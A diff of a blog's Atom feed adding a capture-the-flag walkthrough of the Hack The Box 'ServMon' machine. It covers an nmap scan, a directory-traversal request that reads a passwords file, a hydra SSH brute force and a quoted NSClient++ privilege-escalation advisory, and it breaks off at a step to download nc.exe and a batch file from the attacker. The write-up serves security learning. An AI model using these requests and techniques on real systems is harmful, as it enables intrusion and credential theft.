@@ -1,5 +1,389 @@
 <?xml version="1.0" encoding="utf-8"?>
-<feed xmlns="http://www.w3.org/2005/Atom"><title>maggick's logs - maggick</title><link href="https://maggick.fr/" rel="alternate"></link><link href="https://maggick.fr/feeds/maggick.atom.xml" rel="self"></link><id>https://maggick.fr/</id><updated>2020-06-15T09:00:00+02:00</updated><entry><title>HTB: Monteverde</title><link href="https://maggick.fr/2020/06/htb-monteverde.html" rel="alternate"></link><published>2020-06-15T09:00:00+02:00</published><updated>2020-06-15T09:00:00+02:00</updated><author><name>maggick</name></author><id>tag:maggick.fr,2020-06-15:/2020/06/htb-monteverde.html</id><summary type="html">&lt;p&gt;&lt;img alt="Craft card" class="align-left" src="/media/2020.06/monteverde_card.png" width="262"/&gt;&lt;/p&gt;
+<feed xmlns="http://www.w3.org/2005/Atom"><title>maggick's logs - maggick</title><link href="https://maggick.fr/" rel="alternate"></link><link href="https://maggick.fr/feeds/maggick.atom.xml" rel="self"></link><id>https://maggick.fr/</id><updated>2020-06-21T09:15:00+02:00</updated><entry><title>HTB: ServMon</title><link href="https://maggick.fr/2020/06/htb-servmon.html" rel="alternate"></link><published>2020-06-21T09:15:00+02:00</published><updated>2020-06-21T09:15:00+02:00</updated><author><name>maggick</name></author><id>tag:maggick.fr,2020-06-21:/2020/06/htb-servmon.html</id><summary type="html">&lt;p&gt;&lt;img alt="ServMon Card" class="align-left" src="/media/2020.06/servmon_card.png" width="262"/&gt;&lt;/p&gt;
+&lt;p&gt;This box is a writeup about a retired HacktheBox machine:
+&lt;a href="https://www.hackthebox.eu/home/machines/profile/240"&gt;ServMon&lt;/a&gt; publish on April
+11 2020 by &lt;a href="https://www.hackthebox.eu/home/users/profile/82600"&gt;dmw0ng&lt;/a&gt;.
+This box is rated as an easy box. This box is really unstable and can be a pain
+as there is a lot of reset on public server. It implies an anonymous FTP, a
+&lt;code&gt;Passwords.txt&lt;/code&gt; file and two exploits.&lt;/p&gt;
+</summary><content type="html">&lt;p&gt;&lt;img class="align-left" src="/media/2020.06/servmon_card.png" alt="ServMon Card" width="262"&gt;&lt;/p&gt;
+&lt;p&gt;This box is a writeup about a retired HacktheBox machine:
+&lt;a href="https://www.hackthebox.eu/home/machines/profile/240"&gt;ServMon&lt;/a&gt; publish on April
+11 2020 by &lt;a href="https://www.hackthebox.eu/home/users/profile/82600"&gt;dmw0ng&lt;/a&gt;.
+This box is rated as an easy box. This box is really unstable and can be a pain
+as there is a lot of reset on public server. It implies an anonymous FTP, a
+&lt;code&gt;Passwords.txt&lt;/code&gt; file and two exploits.&lt;/p&gt;
+
+
+&lt;h1 id="user-part"&gt;User part&lt;/h1&gt;
+&lt;h2 id="recon"&gt;Recon&lt;/h2&gt;
+&lt;p&gt;Let us start as always by a &lt;code&gt;nmap&lt;/code&gt; scan. As often with Windows Boxes, a lot of
+port are open. A few interesting services are up:
+  * FTP on port 21
+  * SSH (for Windows) on port 22
+  * a Web service on port 80
+  * a Web service (with SSL) on port 8433&lt;/p&gt;
+&lt;p&gt;Here is the full nmap scan:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;# Nmap 7.80 scan initiated Wed Apr 15 03:04:29 2020 as: nmap -p- -sSV -oN nmap 10.10.10.184&lt;/span&gt;
+&lt;span class="code-line"&gt;Nmap scan report for 10.10.10.184&lt;/span&gt;
+&lt;span class="code-line"&gt;Host is up (0.013s latency).&lt;/span&gt;
+&lt;span class="code-line"&gt;Not shown: 65515 closed ports&lt;/span&gt;
+&lt;span class="code-line"&gt;PORT      STATE SERVICE       VERSION&lt;/span&gt;
+&lt;span class="code-line"&gt;21/tcp    open  ftp           Microsoft ftpd&lt;/span&gt;
+&lt;span class="code-line"&gt;22/tcp    open  ssh           OpenSSH for_Windows_7.7 (protocol 2.0)&lt;/span&gt;
+&lt;span class="code-line"&gt;80/tcp    open  http&lt;/span&gt;
+&lt;span class="code-line"&gt;135/tcp   open  msrpc         Microsoft Windows RPC&lt;/span&gt;
+&lt;span class="code-line"&gt;139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn&lt;/span&gt;
+&lt;span class="code-line"&gt;445/tcp   open  microsoft-ds?&lt;/span&gt;
+&lt;span class="code-line"&gt;5040/tcp  open  unknown&lt;/span&gt;
+&lt;span class="code-line"&gt;5666/tcp  open  nrpe?&lt;/span&gt;
+&lt;span class="code-line"&gt;6063/tcp  open  tcpwrapped&lt;/span&gt;
+&lt;span class="code-line"&gt;6699/tcp  open  napster?&lt;/span&gt;
+&lt;span class="code-line"&gt;7680/tcp  open  pando-pub?&lt;/span&gt;
+&lt;span class="code-line"&gt;8443/tcp  open  ssl/https-alt&lt;/span&gt;
+&lt;span class="code-line"&gt;31336/tcp open  nagios-nsca   Nagios NSCA&lt;/span&gt;
+&lt;span class="code-line"&gt;49664/tcp open  msrpc         Microsoft Windows RPC&lt;/span&gt;
+&lt;span class="code-line"&gt;49665/tcp open  msrpc         Microsoft Windows RPC&lt;/span&gt;
+&lt;span class="code-line"&gt;49666/tcp open  msrpc         Microsoft Windows RPC&lt;/span&gt;
+&lt;span class="code-line"&gt;49667/tcp open  msrpc         Microsoft Windows RPC&lt;/span&gt;
+&lt;span class="code-line"&gt;49668/tcp open  msrpc         Microsoft Windows RPC&lt;/span&gt;
+&lt;span class="code-line"&gt;49669/tcp open  msrpc         Microsoft Windows RPC&lt;/span&gt;
+&lt;span class="code-line"&gt;49670/tcp open  msrpc         Microsoft Windows RPC&lt;/span&gt;
+&lt;span class="code-line"&gt;2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :&lt;/span&gt;
+&lt;span class="code-line"&gt;==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============&lt;/span&gt;
+&lt;span class="code-line"&gt;SF-Port80-TCP:V=7.80%I=7%D=4/15%Time=5E96B393%P=x86_64-pc-linux-gnu%r(NULL&lt;/span&gt;
+&lt;span class="code-line"&gt;SF:,6B,&amp;quot;HTTP/1\.1\x20408\x20Request\x20Timeout\r\nContent-type:\x20text/ht&lt;/span&gt;
+&lt;span class="code-line"&gt;SF:ml\r\nContent-Length:\x200\r\nConnection:\x20close\r\nAuthInfo:\x20\r\n&lt;/span&gt;
+&lt;span class="code-line"&gt;SF:\r\n&amp;quot;)%r(GetRequest,1B4,&amp;quot;HTTP/1\.1\x20200\x20OK\r\nContent-type:\x20tex&lt;/span&gt;
+&lt;span class="code-line"&gt;SF:t/html\r\nContent-Length:\x20340\r\nConnection:\x20close\r\nAuthInfo:\x&lt;/span&gt;
+&lt;span class="code-line"&gt;SF:20\r\n\r\n\xef\xbb\xbf&amp;lt;!DOCTYPE\x20html\x20PUBLIC\x20\&amp;quot;-//W3C//DTD\x20X&lt;/span&gt;
+&lt;span class="code-line"&gt;SF:HTML\x201\.0\x20Transitional//EN\&amp;quot;\x20\&amp;quot;http://www\.w3\.org/TR/xhtml1/D&lt;/span&gt;
+&lt;span class="code-line"&gt;SF:TD/xhtml1-transitional\.dtd\&amp;quot;&amp;gt;\r\n\r\n&amp;lt;html\x20xmlns=\&amp;quot;http://www\.w3\.&lt;/span&gt;
+&lt;span class="code-line"&gt;SF:org/1999/xhtml\&amp;quot;&amp;gt;\r\n&amp;lt;head&amp;gt;\r\n\x20\x20\x20\x20&amp;lt;title&amp;gt;&amp;lt;/title&amp;gt;\r\n\x20\&lt;/span&gt;
+&lt;span class="code-line"&gt;SF:x20\x20\x20&amp;lt;script\x20type=\&amp;quot;text/javascript\&amp;quot;&amp;gt;\r\n\x20\x20\x20\x20\x20&lt;/span&gt;
+&lt;span class="code-line"&gt;SF:\x20\x20\x20window\.location\.href\x20=\x20\&amp;quot;Pages/login\.htm\&amp;quot;;\r\n\x2&lt;/span&gt;
+&lt;span class="code-line"&gt;SF:0\x20\x20\x20&amp;lt;/script&amp;gt;\r\n&amp;lt;/head&amp;gt;\r\n&amp;lt;body&amp;gt;\r\n&amp;lt;/body&amp;gt;\r\n&amp;lt;/html&amp;gt;\r\n&amp;quot;)&lt;/span&gt;
+&lt;span class="code-line"&gt;SF:%r(HTTPOptions,1B4,&amp;quot;HTTP/1\.1\x20200\x20OK\r\nContent-type:\x20text/htm&lt;/span&gt;
+&lt;span class="code-line"&gt;SF:l\r\nContent-Length:\x20340\r\nConnection:\x20close\r\nAuthInfo:\x20\r\&lt;/span&gt;
+&lt;span class="code-line"&gt;SF:n\r\n\xef\xbb\xbf&amp;lt;!DOCTYPE\x20html\x20PUBLIC\x20\&amp;quot;-//W3C//DTD\x20XHTML\&lt;/span&gt;
+&lt;span class="code-line"&gt;SF:x201\.0\x20Transitional//EN\&amp;quot;\x20\&amp;quot;http://www\.w3\.org/TR/xhtml1/DTD/xh&lt;/span&gt;
+&lt;span class="code-line"&gt;SF:tml1-transitional\.dtd\&amp;quot;&amp;gt;\r\n\r\n&amp;lt;html\x20xmlns=\&amp;quot;http://www\.w3\.org/1&lt;/span&gt;
+&lt;span class="code-line"&gt;SF:999/xhtml\&amp;quot;&amp;gt;\r\n&amp;lt;head&amp;gt;\r\n\x20\x20\x20\x20&amp;lt;title&amp;gt;&amp;lt;/title&amp;gt;\r\n\x20\x20\x&lt;/span&gt;
+&lt;span class="code-line"&gt;SF:20\x20&amp;lt;script\x20type=\&amp;quot;text/javascript\&amp;quot;&amp;gt;\r\n\x20\x20\x20\x20\x20\x20\&lt;/span&gt;
+&lt;span class="code-line"&gt;SF:x20\x20window\.location\.href\x20=\x20\&amp;quot;Pages/login\.htm\&amp;quot;;\r\n\x20\x20&lt;/span&gt;
+&lt;span class="code-line"&gt;SF:\x20\x20&amp;lt;/script&amp;gt;\r\n&amp;lt;/head&amp;gt;\r\n&amp;lt;body&amp;gt;\r\n&amp;lt;/body&amp;gt;\r\n&amp;lt;/html&amp;gt;\r\n&amp;quot;)%r(RT&lt;/span&gt;
+&lt;span class="code-line"&gt;SF:SPRequest,1B4,&amp;quot;HTTP/1\.1\x20200\x20OK\r\nContent-type:\x20text/html\r\n&lt;/span&gt;
+&lt;span class="code-line"&gt;SF:Content-Length:\x20340\r\nConnection:\x20close\r\nAuthInfo:\x20\r\n\r\n&lt;/span&gt;
+&lt;span class="code-line"&gt;SF:\xef\xbb\xbf&amp;lt;!DOCTYPE\x20html\x20PUBLIC\x20\&amp;quot;-//W3C//DTD\x20XHTML\x201\&lt;/span&gt;
+&lt;span class="code-line"&gt;SF:.0\x20Transitional//EN\&amp;quot;\x20\&amp;quot;http://www\.w3\.org/TR/xhtml1/DTD/xhtml1-&lt;/span&gt;
+&lt;span class="code-line"&gt;SF:transitional\.dtd\&amp;quot;&amp;gt;\r\n\r\n&amp;lt;html\x20xmlns=\&amp;quot;http://www\.w3\.org/1999/x&lt;/span&gt;
+&lt;span class="code-line"&gt;SF:html\&amp;quot;&amp;gt;\r\n&amp;lt;head&amp;gt;\r\n\x20\x20\x20\x20&amp;lt;title&amp;gt;&amp;lt;/title&amp;gt;\r\n\x20\x20\x20\x2&lt;/span&gt;
+&lt;span class="code-line"&gt;SF:0&amp;lt;script\x20type=\&amp;quot;text/javascript\&amp;quot;&amp;gt;\r\n\x20\x20\x20\x20\x20\x20\x20\x&lt;/span&gt;
+&lt;span class="code-line"&gt;SF:20window\.location\.href\x20=\x20\&amp;quot;Pages/login\.htm\&amp;quot;;\r\n\x20\x20\x20\&lt;/span&gt;
+&lt;span class="code-line"&gt;SF:x20&amp;lt;/script&amp;gt;\r\n&amp;lt;/head&amp;gt;\r\n&amp;lt;body&amp;gt;\r\n&amp;lt;/body&amp;gt;\r\n&amp;lt;/html&amp;gt;\r\n&amp;quot;);&lt;/span&gt;
+&lt;span class="code-line"&gt;==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============&lt;/span&gt;
+&lt;span class="code-line"&gt;SF-Port8443-TCP:V=7.80%T=SSL%I=7%D=4/15%Time=5E96B39B%P=x86_64-pc-linux-gn&lt;/span&gt;
+&lt;span class="code-line"&gt;SF:u%r(GetRequest,E8,&amp;quot;HTTP/1\.1\x20302\r\nContent-Length:\x200\r\nLocation&lt;/span&gt;
+&lt;span class="code-line"&gt;SF::\x20/index\.html\r\n\r\n\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0&lt;/span&gt;
+&lt;span class="code-line"&gt;SF:\0\0\0\0\0\0\&amp;quot;:{\&amp;quot;context\&amp;quot;:\&amp;quot;ini://\${shared-path}/nsclient\.ini\&amp;quot;,\&amp;quot;h&lt;/span&gt;
+&lt;span class="code-line"&gt;SF:as_changed\&amp;quot;:false,\&amp;quot;type\&amp;quot;:\&amp;quot;ini\&amp;quot;}}\]}\0\0\x20keyword\x20to\x20the\x2&lt;/span&gt;
+&lt;span class="code-line"&gt;SF:0message\x20you\x20can\x20use\x20two\x20syntaxes\x20either\x20\${&amp;quot;)%r(H&lt;/span&gt;
+&lt;span class="code-line"&gt;SF:TTPOptions,36,&amp;quot;HTTP/1\.1\x20404\r\nContent-Length:\x2018\r\n\r\nDocumen&lt;/span&gt;
+&lt;span class="code-line"&gt;SF:t\x20not\x20found&amp;quot;)%r(FourOhFourRequest,36,&amp;quot;HTTP/1\.1\x20404\r\nContent&lt;/span&gt;
+&lt;span class="code-line"&gt;SF:-Length:\x2018\r\n\r\nDocument\x20not\x20found&amp;quot;)%r(RTSPRequest,36,&amp;quot;HTTP&lt;/span&gt;
+&lt;span class="code-line"&gt;SF:/1\.1\x20404\r\nContent-Length:\x2018\r\n\r\nDocument\x20not\x20found&amp;quot;)&lt;/span&gt;
+&lt;span class="code-line"&gt;SF:%r(SIPOptions,36,&amp;quot;HTTP/1\.1\x20404\r\nContent-Length:\x2018\r\n\r\nDocu&lt;/span&gt;
+&lt;span class="code-line"&gt;SF:ment\x20not\x20found&amp;quot;);&lt;/span&gt;
+&lt;span class="code-line"&gt;Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .&lt;/span&gt;
+&lt;span class="code-line"&gt;# Nmap done at Wed Apr 15 03:14:06 2020 -- 1 IP address (1 host up) scanned in 577.24 seconds&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;h2 id="ftp"&gt;FTP&lt;/h2&gt;
+&lt;p&gt;Using firefox we can easily connect to the FTP service with an anonymous account.&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Connecting to ftp" src="/media/2020.06/sermonv_01.png"&gt;&lt;/p&gt;
+&lt;p&gt;We found two files:
+* Users/Nadine/confidentiel.txt
+* Users/Nathan/Notes to do.txt&lt;/p&gt;
+&lt;p&gt;The first one contain the following:&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Nathan,&lt;/p&gt;
+&lt;p&gt;I left your Passwords.txt file on your Desktop.  Please remove this once you have edited it yourself and place it back into the secure folder.&lt;/p&gt;
+&lt;p&gt;Regards&lt;/p&gt;
+&lt;p&gt;Nadine&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;The second on contain some TODO list:&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;1) Change the password for NVMS - Complete
+2) Lock down the NSClient Access - Complete
+3) Upload the passwords
+4) Remove public access to NVMS
+5) Place the secret files in SharePoint&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;Therefore we know that there is a &lt;code&gt;Passwords.txt&lt;/code&gt; file on Nathan's desktop and
+that there is two web services : NSClient and NVMS.&lt;/p&gt;
+&lt;h2 id="http"&gt;HTTP&lt;/h2&gt;
+&lt;p&gt;On port 80 we found the NVSM web services with an authentication form.&lt;/p&gt;
+&lt;p&gt;&lt;img alt="NVMS 1000 authentication form" src="/media/2020.06/sermonv_02.png"&gt;&lt;/p&gt;
+&lt;p&gt;We look at the available exploit for NVMS and we found only one about a
+directory traversal.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;kali@kali:~$ searchsploit NVMS&lt;/span&gt;
+&lt;span class="code-line"&gt;--------------------------------------- ----------------------------------------&lt;/span&gt;
+&lt;span class="code-line"&gt;Exploit Title                         |  Path&lt;/span&gt;
+&lt;span class="code-line"&gt;                                      | (/usr/share/exploitdb/)&lt;/span&gt;
+&lt;span class="code-line"&gt;--------------------------------------- ----------------------------------------&lt;/span&gt;
+&lt;span class="code-line"&gt;NVMS 1000 - Directory Traversal        | exploits/hardware/webapps/47774.txt&lt;/span&gt;
+&lt;span class="code-line"&gt;OpenVms 5.3/6.2/7.x - UCX POP Server A | exploits/multiple/local/21856.txt&lt;/span&gt;
+&lt;span class="code-line"&gt;OpenVms 8.3 Finger Service - Stack Buf | exploits/multiple/dos/32193.txt&lt;/span&gt;
+&lt;span class="code-line"&gt;--------------------------------------- ----------------------------------------&lt;/span&gt;
+&lt;span class="code-line"&gt;Shellcodes: No Result&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;kali@kali:~$ cat /usr/share/exploitdb/exploits/hardware/webapps/47774.txt&lt;/span&gt;
+&lt;span class="code-line"&gt;# Title: NVMS-1000 - Directory Traversal&lt;/span&gt;
+&lt;span class="code-line"&gt;# Date: 2019-12-12&lt;/span&gt;
+&lt;span class="code-line"&gt;# Author: Numan Türle&lt;/span&gt;
+&lt;span class="code-line"&gt;# Vendor Homepage: http://en.tvt.net.cn/&lt;/span&gt;
+&lt;span class="code-line"&gt;# Version : N/A&lt;/span&gt;
+&lt;span class="code-line"&gt;# Software Link : http://en.tvt.net.cn/products/188.html&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;POC&lt;/span&gt;
+&lt;span class="code-line"&gt;---------&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;GET /../../../../../../../../../../../../windows/win.ini HTTP/1.1&lt;/span&gt;
+&lt;span class="code-line"&gt;Host: 12.0.0.1&lt;/span&gt;
+&lt;span class="code-line"&gt;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3&lt;/span&gt;
+&lt;span class="code-line"&gt;Accept-Encoding: gzip, deflate&lt;/span&gt;
+&lt;span class="code-line"&gt;Accept-Language: tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7&lt;/span&gt;
+&lt;span class="code-line"&gt;Connection: close&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;Response&lt;/span&gt;
+&lt;span class="code-line"&gt;---------&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;; for 16-bit app support&lt;/span&gt;
+&lt;span class="code-line"&gt;[fonts]&lt;/span&gt;
+&lt;span class="code-line"&gt;[extensions]&lt;/span&gt;
+&lt;span class="code-line"&gt;[mci extensions]&lt;/span&gt;
+&lt;span class="code-line"&gt;[files]&lt;/span&gt;
+&lt;span class="code-line"&gt;[Mail]&lt;/span&gt;
+&lt;span class="code-line"&gt;MAPI=1&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;We fire up burp and make the same request as in the POC (changing the host
+obviously). We got the &lt;code&gt;win.ini&lt;/code&gt; file.&lt;/p&gt;
+&lt;p&gt;We then change our request to get the content of the &lt;code&gt;Passwords.txt&lt;/code&gt; file on
+Nathan's desktop which give us seven passwords.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;GET /../../../../../../../../../../../../Users/Nathan/Desktop/Passwords.txt HTTP/1.1&lt;/span&gt;
+&lt;span class="code-line"&gt;Host: 10.10.10.184&lt;/span&gt;
+&lt;span class="code-line"&gt;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3&lt;/span&gt;
+&lt;span class="code-line"&gt;Accept-Encoding: gzip, deflate&lt;/span&gt;
+&lt;span class="code-line"&gt;Accept-Language: tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7&lt;/span&gt;
+&lt;span class="code-line"&gt;Connection: close&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;HTTP/1.1 200 OK&lt;/span&gt;
+&lt;span class="code-line"&gt;Content-type: text/plain&lt;/span&gt;
+&lt;span class="code-line"&gt;Content-Length: 156&lt;/span&gt;
+&lt;span class="code-line"&gt;Connection: close&lt;/span&gt;
+&lt;span class="code-line"&gt;AuthInfo:&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;1nsp3ctTh3Way2Mars!&lt;/span&gt;
+&lt;span class="code-line"&gt;Th3r34r3To0M4nyTrait0r5!&lt;/span&gt;
+&lt;span class="code-line"&gt;B3WithM30r4ga1n5tMe&lt;/span&gt;
+&lt;span class="code-line"&gt;L1k3B1gBut7s@W0rk&lt;/span&gt;
+&lt;span class="code-line"&gt;0nly7h3y0unGWi11F0l10w&lt;/span&gt;
+&lt;span class="code-line"&gt;IfH3s4b0Utg0t0H1sH0me&lt;/span&gt;
+&lt;span class="code-line"&gt;Gr4etN3w5w17hMySk1Pa5$&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;We try this passwords against the NVMS authentication form but without success.&lt;/p&gt;
+&lt;h2 id="ssh"&gt;SSH&lt;/h2&gt;
+&lt;p&gt;As there is other services, we try our seven password against the SSH service.
+We have two users &lt;code&gt;nathan&lt;/code&gt; and &lt;code&gt;nadine&lt;/code&gt;. Using &lt;code&gt;hydra&lt;/code&gt; we easily find the creds
+for nadine's SSH account.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;kali@kali:~/pown/htb_servmon$ hydra -l nathan -P pass ssh://10.10.10.184&lt;/span&gt;
+&lt;span class="code-line"&gt;Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-04-16 12:28:14&lt;/span&gt;
+&lt;span class="code-line"&gt;[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4&lt;/span&gt;
+&lt;span class="code-line"&gt;[DATA] max 7 tasks per 1 server, overall 7 tasks, 7 login tries (l:1/p:7), ~1 try per task&lt;/span&gt;
+&lt;span class="code-line"&gt;[DATA] attacking ssh://10.10.10.184:22/&lt;/span&gt;
+&lt;span class="code-line"&gt;1 of 1 target completed, 0 valid passwords found&lt;/span&gt;
+&lt;span class="code-line"&gt;Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-04-16 12:28:19&lt;/span&gt;
+&lt;span class="code-line"&gt;kali@kali:~/pown/htb_servmon$ hydra -l nadine -P pass ssh://10.10.10.184&lt;/span&gt;
+&lt;span class="code-line"&gt;Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-04-16 12:28:26&lt;/span&gt;
+&lt;span class="code-line"&gt;[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4&lt;/span&gt;
+&lt;span class="code-line"&gt;[DATA] max 7 tasks per 1 server, overall 7 tasks, 7 login tries (l:1/p:7), ~1 try per task&lt;/span&gt;
+&lt;span class="code-line"&gt;[DATA] attacking ssh://10.10.10.184:22/&lt;/span&gt;
+&lt;span class="code-line"&gt;[22][ssh] host: 10.10.10.184   login: nadine   password: L1k3B1gBut7s@W0rk&lt;/span&gt;
+&lt;span class="code-line"&gt;1 of 1 target successfully completed, 1 valid password found&lt;/span&gt;
+&lt;span class="code-line"&gt;Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-04-16 12:28:35&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;We can the connect to the server using SSH and get the user flag.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;kali@kali:~/pown/htb_servmon$ ssh nadine@10.10.10.184&lt;/span&gt;
+&lt;span class="code-line"&gt;Microsoft Windows [Version 10.0.18363.752]&lt;/span&gt;
+&lt;span class="code-line"&gt;(c) 2019 Microsoft Corporation. All rights reserved.&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;nadine@SERVMON C:\Users\Nadine&amp;gt;type Desktop\user.txt&lt;/span&gt;
+&lt;span class="code-line"&gt;e9aa044247ca285bb777782d7b0cfdfd&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;h1 id="root"&gt;Root&lt;/h1&gt;
+&lt;p&gt;For the root part we need to exploit the NSClient on port 8443 as there is a
+privilege escalation vulnerability.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;kali@kali:~$ searchsploit NSclient&lt;/span&gt;
+&lt;span class="code-line"&gt;---------------------------------------------------- ----------------------------------------&lt;/span&gt;
+&lt;span class="code-line"&gt;Exploit Title                                      |  Path&lt;/span&gt;
+&lt;span class="code-line"&gt;                                                    | (/usr/share/exploitdb/)&lt;/span&gt;
+&lt;span class="code-line"&gt;---------------------------------------------------- ----------------------------------------&lt;/span&gt;
+&lt;span class="code-line"&gt;NSClient++ 0.5.2.35 - Privilege Escalation          | exploits/windows/local/46802.txt&lt;/span&gt;
+&lt;span class="code-line"&gt;---------------------------------------------------- ----------------------------------------&lt;/span&gt;
+&lt;span class="code-line"&gt;Shellcodes: No Result&lt;/span&gt;
+&lt;span class="code-line"&gt;kali@kali:~$ cat /usr/share/exploitdb/exploits/windows/local/46802.txt&lt;/span&gt;
+&lt;span class="code-line"&gt;Exploit Author: bzyo&lt;/span&gt;
+&lt;span class="code-line"&gt;Twitter: @bzyo_&lt;/span&gt;
+&lt;span class="code-line"&gt;Exploit Title: NSClient++ 0.5.2.35 - Privilege Escalation&lt;/span&gt;
+&lt;span class="code-line"&gt;Date: 05-05-19&lt;/span&gt;
+&lt;span class="code-line"&gt;Vulnerable Software: NSClient++ 0.5.2.35&lt;/span&gt;
+&lt;span class="code-line"&gt;Vendor Homepage: http://nsclient.org/&lt;/span&gt;
+&lt;span class="code-line"&gt;Version: 0.5.2.35&lt;/span&gt;
+&lt;span class="code-line"&gt;Software Link: http://nsclient.org/download/&lt;/span&gt;
+&lt;span class="code-line"&gt;Tested on: Windows 10 x64&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;Details:&lt;/span&gt;
+&lt;span class="code-line"&gt;When NSClient++ is installed with Web Server enabled, local low privilege users have the ability to read the web administator&amp;#39;s password in cleartext from the configuration file.  From here a user is able to login to the web server and make changes to the configuration file that is normally restricted.&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;The user is able to enable the modules to check external scripts and schedule those scripts to run.  There doesn&amp;#39;t seem to be restrictions on where the scripts are called from, so the user can create the script anywhere.  Since the NSClient++ Service runs as Local System, these scheduled scripts run as that user and the low privilege user can gain privilege escalation.  A reboot, as far as I can tell, is required to reload and read the changes to the web config.&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;Prerequisites:&lt;/span&gt;
+&lt;span class="code-line"&gt;To successfully exploit this vulnerability, an attacker must already have local access to a system running NSClient++ with Web Server enabled using a low privileged user account with the ability to reboot the system.&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;Exploit:&lt;/span&gt;
+&lt;span class="code-line"&gt;1. Grab web administrator password&lt;/span&gt;
+&lt;span class="code-line"&gt;- open c:\program files\nsclient++\nsclient.ini&lt;/span&gt;
+&lt;span class="code-line"&gt;or&lt;/span&gt;
+&lt;span class="code-line"&gt;- run the following that is instructed when you select forget password&lt;/span&gt;
+&lt;span class="code-line"&gt;        C:\Program Files\NSClient++&amp;gt;nscp web -- password --display&lt;/span&gt;
+&lt;span class="code-line"&gt;        Current password: SoSecret&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;2. Login and enable following modules including enable at startup and save configuration&lt;/span&gt;
+&lt;span class="code-line"&gt;- CheckExternalScripts&lt;/span&gt;
+&lt;span class="code-line"&gt;- Scheduler&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;3. Download nc.exe and evil.bat to c:\temp from attacking machine&lt;/span&gt;
